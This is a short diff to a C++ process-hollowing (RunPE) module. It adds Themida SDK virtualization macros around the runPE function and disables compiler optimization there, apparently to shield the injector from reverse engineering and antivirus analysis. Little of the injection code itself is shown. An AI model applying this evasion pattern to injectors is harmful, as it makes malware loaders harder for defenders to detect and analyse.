@@ -1,5 +1,7 @@
 #include "ProcessHollowing.h"
 
+#include "ThemidaSDK.h"
+
 HANDLE ProcessHollowing::getFileContent(const wchar_t* lpFilePath)
 {
 	const HANDLE hFile = CreateFileW(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
@@ -454,8 +456,11 @@ BOOL ProcessHollowing::runPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVO
 	return TRUE;
 }
 
+#pragma optimize("", off)
 DWORD ProcessHollowing::runPE(LPVOID payloadData, const wchar_t* targetPath, bool fromFile)
 {
+	VM_SHARK_BLACK_START
+
 	if (payloadData == nullptr)
 		return 0;
 
@@ -617,8 +622,11 @@ DWORD ProcessHollowing::runPE(LPVOID payloadData, const wchar_t* targetPath, boo
 		CloseHandle(PI.hProcess);
 	}
 
+	VM_SHARK_BLACK_END
+
 	return 0;
 }
+#pragma optimize("", on)
 
 DWORD ProcessHollowing::RunPE(const wchar_t* payloadPath, const wchar_t* targetPath32, const wchar_t* targetPath64)
 {
